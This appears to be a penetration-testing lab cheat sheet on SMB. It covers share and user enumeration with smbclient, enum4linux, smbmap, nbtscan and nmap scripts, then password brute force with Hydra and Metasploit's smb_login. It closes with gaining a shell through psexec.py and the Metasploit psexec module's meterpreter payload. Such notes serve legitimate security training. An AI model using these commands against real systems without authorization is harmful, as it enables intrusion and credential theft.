# SMB

## Enumeration

### Nmblookup Tool

* <mark style="color:yellow;">nmblookup -A demo.ine.local</mark>: Queries NetBIOS names on a network.
  * <mark style="color:yellow;">-A</mark>: Defines the target.

### SMBClient Tool

* <mark style="color:yellow;">smbclient -L demo.ine.local -N</mark>: Listing available shares at "demo.ine.local"
  * <mark style="color:yellow;">-L</mark>: List available shares
  * <mark style="color:yellow;">-N</mark>: Tries to use anonymous login.
    * <mark style="color:yellow;">smbclient -N \\\\\\\targetIP\\\share</mark>

### RPCClient Tool

* <mark style="color:yellow;">rcpclient -U -N demo.ine.local</mark>: Same as SMBClient
  * <mark style="color:yellow;">-U</mark>: Specified the user for authentication.
  * <mark style="color:yellow;">-N</mark>: Tells rpcclient to not prompt a password.

### Using SMBMap

This is a Samba share enumerator

To enumerate run:

* <mark style="color:yellow;">smbmap -H targetIP -u admin -p password</mark>

#### Listing the  shares:

* <mark style="color:yellow;">smbclient -L targetIP -U admin</mark>

Gaining access to the interface:

* <mark style="color:yellow;">smbclient //targetIP/'nameofshare' -U admin</mark>

### enum4linux

It is an enumeration tool for Samba.

* <mark style="color:yellow;">enum4linux -a targetIP</mark>
  * <mark style="color:red;">-a</mark>: All information

Enumerate with credentials:

* <mark style="color:yellow;">enum4linux -a -u admin -p password1 targetIP</mark>

#### Using enum4linux with RID Cycling

RID cycling is an enumeration technique to brute force the RID to SID mappings of users.

* <mark style="color:yellow;">enum4linux -u \[username] -p \[password] -U \[target IP]</mark>

After we get the RIDs, which will be in hexadecimal we have to convert them and to get te SIDs we append the RID to the Domain Sid.

## NetBIOS Enumeration

### Using nbtscan

Scans networks for NetBIOS name information

* <mark style="color:yellow;">nbtscan targetnetwork/24</mark>

### Using nbstat nmap script

* <mark style="color:yellow;">nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n targetIP</mark>

## Starting SMB Enumeration

Nmap scan ports 139,445 with -sV

### Using NSE

* <mark style="color:yellow;">nmap -p445 --script smb-protocols targetIP</mark>&#x20;

### Identify the SMB protocol Security Level

* <mark style="color:yellow;">nmap -p445 --script smb-security-mode targetIP</mark>&#x20;

Gives  you account details

### Using smbclient

#### Trying for anonymous login:

* <mark style="color:yellow;">smbclient -L targetIP</mark>

#### Now we can do user enumeration through the SMB service:

* <mark style="color:yellow;">nmap -p445 --script smb-enum-users targetIP</mark>

#### Create a text file with the enumerated users and use hydra to perform a bruteforce attack:

* <mark style="color:yellow;">hydra -L nameofusersfile -P /usr/share/metassploit-framework/data/wordlists/unix\_passwords.txt targetIP smb</mark>

## Performing SMB Brute-Force

Start msfconsole and postgresql.

Modules used:

* <mark style="color:yellow;">auxiliary/scanner/smb/smb\_login</mark>

Configure  RHOST

Specify <mark style="color:red;">USER\_FILE</mark> and <mark style="color:red;">PASS\_FILE</mark>.

After getting the credentials getting a command prompt using PSExec:

* <mark style="color:yellow;">psexec.py Administrator@targetIP cmd.exe</mark>

## Metasploit Module

<mark style="color:red;">exploit/windows/smb/psexec</mark>

Authenticates using SMB and uploads a payload that gives us a meterpreter session on the target sytem.

Use module

Set RHOSTS

Set credentials obtained in <mark style="color:red;">SMBUser</mark> and <mark style="color:red;">SMBPass</mark>

Set the  payload options.
